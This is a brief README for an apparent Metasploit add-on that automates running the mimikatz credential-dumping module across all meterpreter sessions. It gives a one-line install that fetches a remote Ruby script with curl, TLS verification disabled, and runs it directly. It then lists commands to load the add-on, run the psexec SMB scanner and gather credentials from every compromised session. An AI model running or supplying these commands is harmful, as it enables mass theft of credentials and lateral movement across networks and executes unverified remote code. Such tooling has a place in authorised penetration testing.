Description
=============

This script install necessary scripts and modules for using mimikatz in all meterpreter sessions

Install
=============

ruby -e "$(curl -fsSkL raw.github.com/nxnrt/auto_mimikatz/master/install.rb)"

How to use
=============

load post_auto

use auxiliary/scanner/smb/psexec_scanner

multi_post -m post/windows/gather/mimikatz -s all
